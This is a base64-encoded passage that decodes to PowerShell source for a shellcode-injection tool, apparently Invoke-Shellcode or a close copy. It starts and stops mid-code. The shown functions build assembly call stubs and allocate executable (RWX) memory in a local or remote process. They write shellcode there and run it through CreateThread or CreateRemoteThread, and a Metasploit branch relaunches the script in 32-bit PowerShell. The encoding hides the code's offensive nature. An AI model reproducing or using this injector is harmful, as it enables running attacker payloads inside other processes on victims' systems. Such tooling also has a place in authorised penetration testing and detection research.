T2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkNCiAgICAgICAgDQogICAgICAgICMgUmV0dXJuIHRoZSBhZGRyZXNzIG9mIHRoZSBmdW5jdGlvbg0KICAgICAgICBXcml0ZS1PdXRwdXQgJEdldFByb2NBZGRyZXNzLkludm9rZSgkbnVsbCwgQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSkNCiAgICB9DQoNCiAgICAjIEVtaXRzIGEgc2hlbGxjb2RlIHN0dWIgdGhhdCB3aGVuIGluamVjdGVkIHdpbGwgY3JlYXRlIGEgdGhyZWFkIGFuZCBwYXNzIGV4ZWN1dGlvbiB0byB0aGUgbWFpbiBzaGVsbGNvZGUgcGF5bG9hZA0KICAgIGZ1bmN0aW9uIExvY2FsOkVtaXQtQ2FsbFRocmVhZFN0dWIgKFtJbnRQdHJdICRCYXNlQWRkciwgW0ludFB0cl0gJEV4aXRUaHJlYWRBZGRyLCBbSW50XSAkQXJjaGl0ZWN0dXJlKQ0KICAgIHsNCiAgICAgICAgJEludFNpemVQdHIgPSAkQXJjaGl0ZWN0dXJlIC8gOA0KDQogICAgICAgIGZ1bmN0aW9uIExvY2FsOkNvbnZlcnRUby1MaXR0bGVFbmRpYW4gKFtJbnRQdHJdICRBZGRyZXNzKQ0KICAgICAgICB7DQogICAgICAgICAgICAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5ID0gTmV3LU9iamVjdCBCeXRlW10oMCkNCiAgICAgICAgICAgICRBZGRyZXNzLlRvU3RyaW5nKCJYJCgkSW50U2l6ZVB0cioyKSIpIC1zcGxpdCAnKFtBLUYwLTldezJ9KScgfCBGb3JFYWNoLU9iamVjdCB7IGlmICgkXykgeyAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5ICs9IFtCeXRlXSAoJzB4ezB9JyAtZiAkXykgfSB9DQogICAgICAgICAgICBbU3lzdGVtLkFycmF5XTo6UmV2ZXJzZSgkTGl0dGxlRW5kaWFuQnl0ZUFycmF5KQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgJExpdHRsZUVuZGlhbkJ5dGVBcnJheQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAkQ2FsbFN0dWIgPSBOZXctT2JqZWN0IEJ5dGVbXSgwKQ0KICAgICAgICANCiAgICAgICAgaWYgKCRJbnRTaXplUHRyIC1lcSA4KQ0KICAgICAgICB7DQogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweDQ4LDB4QjggICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZzaGVsbGNvZGUNCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRCYXNlQWRkciAgICAgICAjICZzaGVsbGNvZGUNCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIFJBWA0KICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwDQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZFeGl0VGhyZWFkDQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkRXhpdFRocmVhZEFkZHIgIyAmRXhpdFRocmVhZA0KICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgUkFYDQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBEV09SRCBFQVgsICZzaGVsbGNvZGUNCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRCYXNlQWRkciAgICAgICAjICZzaGVsbGNvZGUNCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIEVBWA0KICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwDQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhCOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBEV09SRCBFQVgsICZFeGl0VGhyZWFkDQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkRXhpdFRocmVhZEFkZHIgIyAmRXhpdFRocmVhZA0KICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgRUFYDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIFdyaXRlLU91dHB1dCAkQ2FsbFN0dWINCiAgICB9DQoNCiAgICBmdW5jdGlvbiBMb2NhbDpJbmplY3QtUmVtb3RlU2hlbGxjb2RlIChbSW50XSAkUHJvY2Vzc0lEKQ0KICAgIHsNCiAgICAgICAgIyBPcGVuIGEgaGFuZGxlIHRvIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBpbnRvDQogICAgICAgICRoUHJvY2VzcyA9ICRPcGVuUHJvY2Vzcy5JbnZva2UoMHgwMDFGMEZGRiwgJGZhbHNlLCAkUHJvY2Vzc0lEKSAjIFByb2Nlc3NBY2Nlc3NGbGFncy5BbGwgKDB4MDAxRjBGRkYpDQogICAgICAgIA0KICAgICAgICBpZiAoISRoUHJvY2VzcykNCiAgICAgICAgew0KICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBvcGVuIGEgcHJvY2VzcyBoYW5kbGUgZm9yIFBJRDogJFByb2Nlc3NJRCINCiAgICAgICAgfQ0KDQogICAgICAgICRJc1dvdzY0ID0gJGZhbHNlDQoNCiAgICAgICAgaWYgKCQ2NGJpdENQVSkgIyBPbmx5IHBlcmZvcm0gdGhlc2VzIGNoZWNrcyBpZiBDUFUgaXMgNjQtYml0DQogICAgICAgIHsNCiAgICAgICAgICAgICMgRGV0ZXJtaW5lIGlzIHRoZSBwcm9jZXNzIHNwZWNpZmllZCBpcyAzMiBvciA2NCBiaXQNCiAgICAgICAgICAgICRJc1dvdzY0UHJvY2Vzcy5JbnZva2UoJGhQcm9jZXNzLCBbUmVmXSAkSXNXb3c2NCkgfCBPdXQtTnVsbA0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoKCEkSXNXb3c2NCkgLWFuZCAkUG93ZXJTaGVsbDMyYml0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFRocm93ICdVbmFibGUgdG8gaW5qZWN0IDY0LWJpdCBzaGVsbGNvZGUgZnJvbSB3aXRoaW4gMzItYml0IFBvd2Vyc2hlbGwuIFVzZSB0aGUgNjQtYml0IHZlcnNpb24gb2YgUG93ZXJzaGVsbCBpZiB5b3Ugd2FudCB0aGlzIHRvIHdvcmsuJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZWlmICgkSXNXb3c2NCkgIyAzMi1iaXQgV293NjQgcHJvY2Vzcw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyDQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnSW5qZWN0aW5nIGludG8gYSBXb3c2NCBwcm9jZXNzLicNCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgIyA2NC1iaXQgcHJvY2Vzcw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlNjQuTGVuZ3RoIC1lcSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0DQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgNjQtYml0IHNoZWxsY29kZS4nDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZWxzZSAjIDMyLWJpdCBDUFUNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyDQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicNCiAgICAgICAgfQ0KDQogICAgICAgICMgUmVzZXJ2ZSBhbmQgY29tbWl0IGVub3VnaCBtZW1vcnkgaW4gcmVtb3RlIHByb2Nlc3MgdG8gaG9sZCB0aGUgc2hlbGxjb2RlDQogICAgICAgICRSZW1vdGVNZW1BZGRyID0gJFZpcnR1YWxBbGxvY0V4Lkludm9rZSgkaFByb2Nlc3MsIFtJbnRQdHJdOjpaZXJvLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkNCiAgICAgICAgDQogICAgICAgIGlmICghJFJlbW90ZU1lbUFkZHIpDQogICAgICAgIHsNCiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgc2hlbGxjb2RlIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNoZWxsY29kZSBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRSZW1vdGVNZW1BZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSINCg0KICAgICAgICAjIENvcHkgc2hlbGxjb2RlIGludG8gdGhlIHByZXZpb3VzbHkgYWxsb2NhdGVkIG1lbW9yeQ0KICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVNZW1BZGRyLCAkU2hlbGxjb2RlLCAkU2hlbGxjb2RlLkxlbmd0aCwgW1JlZl0gMCkgfCBPdXQtTnVsbA0KDQogICAgICAgICMgR2V0IGFkZHJlc3Mgb2YgRXhpdFRocmVhZCBmdW5jdGlvbg0KICAgICAgICAkRXhpdFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEV4aXRUaHJlYWQNCg0KICAgICAgICBpZiAoJElzV293NjQpDQogICAgICAgIHsNCiAgICAgICAgICAgICMgQnVpbGQgMzItYml0IGlubGluZSBhc3NlbWJseSBzdHViIHRvIGNhbGwgdGhlIHNoZWxsY29kZSB1cG9uIGNyZWF0aW9uIG9mIGEgcmVtb3RlIHRocmVhZC4NCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJFJlbW90ZU1lbUFkZHIgJEV4aXRUaHJlYWRBZGRyIDMyDQogICAgICAgICAgICANCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgIyBCdWlsZCA2NC1iaXQgaW5saW5lIGFzc2VtYmx5IHN0dWIgdG8gY2FsbCB0aGUgc2hlbGxjb2RlIHVwb24gY3JlYXRpb24gb2YgYSByZW1vdGUgdGhyZWFkLg0KICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkUmVtb3RlTWVtQWRkciAkRXhpdFRocmVhZEFkZHIgNjQNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgNjQtYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nDQogICAgICAgIH0NCg0KICAgICAgICAjIEFsbG9jYXRlIGlubGluZSBhc3NlbWJseSBzdHViDQogICAgICAgICRSZW1vdGVTdHViQWRkciA9ICRWaXJ0dWFsQWxsb2NFeC5JbnZva2UoJGhQcm9jZXNzLCBbSW50UHRyXTo6WmVybywgJENhbGxTdHViLkxlbmd0aCwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQ0KICAgICAgICANCiAgICAgICAgaWYgKCEkUmVtb3RlU3R1YkFkZHIpDQogICAgICAgIHsNCiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIg0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBXcml0ZS1WZXJib3NlICJUaHJlYWQgY2FsbCBzdHViIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJFJlbW90ZVN0dWJBZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSINCg0KICAgICAgICAjIFdyaXRlIDMyLWJpdCBhc3NlbWJseSBzdHViIHRvIHJlbW90ZSBwcm9jZXNzIG1lbW9yeSBzcGFjZQ0KICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVTdHViQWRkciwgJENhbGxTdHViLCAkQ2FsbFN0dWIuTGVuZ3RoLCBbUmVmXSAwKSB8IE91dC1OdWxsDQoNCiAgICAgICAgIyBFeGVjdXRlIHNoZWxsY29kZSBhcyBhIHJlbW90ZSB0aHJlYWQNCiAgICAgICAgJFRocmVhZEhhbmRsZSA9ICRDcmVhdGVSZW1vdGVUaHJlYWQuSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sIDAsICRSZW1vdGVTdHViQWRkciwgJFJlbW90ZU1lbUFkZHIsIDAsIFtJbnRQdHJdOjpaZXJvKQ0KICAgICAgICANCiAgICAgICAgaWYgKCEkVGhyZWFkSGFuZGxlKQ0KICAgICAgICB7DQogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxhdW5jaCByZW1vdGUgdGhyZWFkIGluIFBJRDogJFByb2Nlc3NJRCINCiAgICAgICAgfQ0KDQogICAgICAgICMgQ2xvc2UgcHJvY2VzcyBoYW5kbGUNCiAgICAgICAgJENsb3NlSGFuZGxlLkludm9rZSgkaFByb2Nlc3MpIHwgT3V0LU51bGwNCg0KICAgICAgICBXcml0ZS1WZXJib3NlICdTaGVsbGNvZGUgaW5qZWN0aW9uIGNvbXBsZXRlIScNCiAgICB9DQoNCiAgICBmdW5jdGlvbiBMb2NhbDpJbmplY3QtTG9jYWxTaGVsbGNvZGUNCiAgICB7DQogICAgICAgIGlmICgkUG93ZXJTaGVsbDMyYml0KSB7DQogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzINCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDMyLWJpdCBzaGVsbGNvZGUuJw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJw0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0DQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyA2NC1iaXQgc2hlbGxjb2RlLicNCiAgICAgICAgfQ0KICAgIA0KICAgICAgICAjIEFsbG9jYXRlIFJXWCBtZW1vcnkgZm9yIHRoZSBzaGVsbGNvZGUNCiAgICAgICAgJEJhc2VBZGRyZXNzID0gJFZpcnR1YWxBbGxvYy5JbnZva2UoW0ludFB0cl06Olplcm8sICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQ0KICAgICAgICBpZiAoISRCYXNlQWRkcmVzcykNCiAgICAgICAgew0KICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBzaGVsbGNvZGUgbWVtb3J5IGluIFBJRDogJFByb2Nlc3NJRCINCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJEJhc2VBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSINCg0KICAgICAgICAjIENvcHkgc2hlbGxjb2RlIHRvIFJXWCBidWZmZXINCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkU2hlbGxjb2RlLCAwLCAkQmFzZUFkZHJlc3MsICRTaGVsbGNvZGUuTGVuZ3RoKQ0KICAgICAgICANCiAgICAgICAgIyBHZXQgYWRkcmVzcyBvZiBFeGl0VGhyZWFkIGZ1bmN0aW9uDQogICAgICAgICRFeGl0VGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRXhpdFRocmVhZA0KICAgICAgICANCiAgICAgICAgaWYgKCRQb3dlclNoZWxsMzJiaXQpDQogICAgICAgIHsNCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciAzMg0KICAgICAgICAgICAgDQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyAzMi1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciA2NA0KICAgICAgICAgICAgDQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyA2NC1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicNCiAgICAgICAgfQ0KDQogICAgICAgICMgQWxsb2NhdGUgUldYIG1lbW9yeSBmb3IgdGhlIHRocmVhZCBjYWxsIHN0dWINCiAgICAgICAgJENhbGxTdHViQWRkcmVzcyA9ICRWaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkQ2FsbFN0dWIuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQ0KICAgICAgICBpZiAoISRDYWxsU3R1YkFkZHJlc3MpDQogICAgICAgIHsNCiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1Yi4iDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkQ2FsbFN0dWJBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSINCg0KICAgICAgICAjIENvcHkgY2FsbCBzdHViIHRvIFJXWCBidWZmZXINCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkQ2FsbFN0dWIsIDAsICRDYWxsU3R1YkFkZHJlc3MsICRDYWxsU3R1Yi5MZW5ndGgpDQoNCiAgICAgICAgIyBMYXVuY2ggc2hlbGxjb2RlIGluIGl0J3Mgb3duIHRocmVhZA0KICAgICAgICAkVGhyZWFkSGFuZGxlID0gJENyZWF0ZVRocmVhZC5JbnZva2UoW0ludFB0cl06Olplcm8sIDAsICRDYWxsU3R1YkFkZHJlc3MsICRCYXNlQWRkcmVzcywgMCwgW0ludFB0cl06Olplcm8pDQogICAgICAgIGlmICghJFRocmVhZEhhbmRsZSkNCiAgICAgICAgew0KICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBsYXVuY2ggdGhyZWFkLiINCiAgICAgICAgfQ0KDQogICAgICAgICMgV2FpdCBmb3Igc2hlbGxjb2RlIHRocmVhZCB0byB0ZXJtaW5hdGUNCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRUaHJlYWRIYW5kbGUsIDB4RkZGRkZGRkYpIHwgT3V0LU51bGwNCiAgICAgICAgDQogICAgICAgICRWaXJ0dWFsRnJlZS5JbnZva2UoJENhbGxTdHViQWRkcmVzcywgJENhbGxTdHViLkxlbmd0aCArIDEsIDB4ODAwMCkgfCBPdXQtTnVsbCAjIE1FTV9SRUxFQVNFICgweDgwMDApDQogICAgICAgICRWaXJ0dWFsRnJlZS5JbnZva2UoJEJhc2VBZGRyZXNzLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4ODAwMCkgfCBPdXQtTnVsbCAjIE1FTV9SRUxFQVNFICgweDgwMDApDQoNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAnU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEnDQogICAgfQ0KDQogICAgIyBBIHZhbGlkIHBvaW50ZXIgdG8gSXNXb3c2NFByb2Nlc3Mgd2lsbCBiZSByZXR1cm5lZCBpZiBDUFUgaXMgNjQtYml0DQogICAgJElzV293NjRQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgSXNXb3c2NFByb2Nlc3MNCiAgICBpZiAoJElzV293NjRQcm9jZXNzQWRkcikNCiAgICB7DQogICAgCSRJc1dvdzY0UHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbQm9vbF0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQ0KICAgIAkkSXNXb3c2NFByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSXNXb3c2NFByb2Nlc3NBZGRyLCAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSkNCiAgICAgICAgDQogICAgICAgICQ2NGJpdENQVSA9ICR0cnVlDQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgCSQ2NGJpdENQVSA9ICRmYWxzZQ0KICAgIH0NCg0KICAgIGlmIChbSW50UHRyXTo6U2l6ZSAtZXEgNCkNCiAgICB7DQogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkdHJ1ZQ0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgICAgICAkUG93ZXJTaGVsbDMyYml0ID0gJGZhbHNlDQogICAgfQ0KDQogICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1lcSAnTWV0YXNwbG9pdCcpDQogICAgew0KICAgICAgICBpZiAoISRQb3dlclNoZWxsMzJiaXQpIHsNCiAgICAgICAgICAgICMgVGhlIGN1cnJlbnRseSBzdXBwb3J0ZWQgTWV0YXNwbG9pdCBwYXlsb2FkcyBhcmUgMzItYml0LiBUaGlzIGJsb2NrIG9mIGNvZGUgaW1wbGVtZW50cyB0aGUgbG9naWMgdG8gZXhlY3V0ZSB0aGlzIHNjcmlwdCBmcm9tIDMyLWJpdCBQb3dlclNoZWxsDQogICAgICAgICAgICAjIEdldCB0aGlzIHNjcmlwdCdzIGNvbnRlbnRzIGFuZCBwYXNzIGl0IHRvIDMyLWJpdCBwb3dlcnNoZWxsIHdpdGggdGhlIHNhbWUgcGFyYW1ldGVycyBwYXNzZWQgdG8gdGhpcyBmdW5jdGlvbg0KDQogICAgICAgICAgICAjIFB1bGwgb3V0IGp1c3QgdGhlIGNvbnRlbnQgb2YgdGhlIHRoaXMgc2NyaXB0J3MgaW52b2NhdGlvbi4NCiAgICAgICAgICAgICRSb290SW52b2NhdGlvbiA9ICRNeUludm9jYXRpb24uTGluZQ0KDQogICAgICAgICAgICAkUmVzcG9uc2UgPSAkVHJ1ZQ0KICAgICAgICANCiAgICAgICAgICAgIGlmICggJEZvcmNlIC1vciAoICRSZXNwb25zZSA9ICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggIkRvIHlvdSB3YW50IHRvIGxhdW5jaCB0aGUgcGF5bG9hZCBmcm9tIHg4NiBQb3dlcnNoZWxsPyIsDQogICAgICAgICAgICAgICAgICAgIkF0dGVtcHQgdG8gZXhlY3V0ZSAzMi1iaXQgc2hlbGxjb2RlIGZyb20gNjQtYml0IFBvd2Vyc2hlbGwuIE5vdGU6IFRoaXMgcHJvY2VzcyB0YWtlcyBhYm91dCBvbmUgbWludXRlLiBCZSBwYXRpZW50ISBZb3Ugd2lsbCBhbHNvIHNlZSBzb21lIGFydGlmYWN0cyBvZiB0aGUgc2NyaXB0IGxvYWRpbmcgaW4gdGhlIG90aGVyIHByb2Nlc3MuIiApICkgKSB7IH0NCiAgICAgICAgDQogICAgICAgICAgICBpZiAoICEkUmVzcG9uc2UgKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICMgVXNlciBvcHRlZCBub3QgdG8gbGF1bmNoIHRoZSAzMi1iaXQgcGF5bG9hZCBmcm9tIDMyLWJpdCBQb3dlclNoZWxsLiBFeGl0IGZ1bmN0aW9uDQogICAgICAgICAgICAgICAgUmV0dXJuDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICMgU2luY2UgdGhlIHNoZWxsY29kZSB3aWxsIHJ1biBpbiBhIG5vbmludGVyYWN0aXZlIGluc3RhbmNlIG9mIFBvd2VyU2hlbGwsIG1ha2Ugc3VyZSB0aGUgLUZvcmNlIHN3aXRjaCBpcyBpbmNsdWRlZCBzbyB0aGF0IHRoZXJlIGlzIG5vIHdhcm5pbmcgcHJvbXB0Lg0KICAgICAgICAgICAgaWYgKCRNeUludm9jYXRpb24uQm91bmRQYXJhbWV0ZXJzWydGb3JjZSddKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkV4ZWN1dGluZyB0aGUgZm9sbG93aW5nIGZyb20gMzItYml0IFBvd2VyU2hlbGw6ICRSb290SW52b2NhdGlvbiINCiAgICAgICAgICAgICAgICAkQ29tbWFuZCA9ICJmdW5jdGlvbiAkKCRNeUludm9jYXRpb24uSW52b2NhdGlvbk5hbWUpIHtgbiIgKyAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5TY3JpcHRCbG9jayArICJgbn1gbiQoJFJvb3RJbnZvY2F0aW9uKWBuYG4iDQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhlY3V0aW5nIHRoZSBmb2xsb3dpbmcgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbDogJFJvb3RJbnZvY2F0aW9uIC1Gb3JjZSINCiAgICAgICAgICAgICAgICAkQ29tbWFuZCA9ICJmdW5jdGlvbiAkKCRNeUludm9jYXRpb24uSW52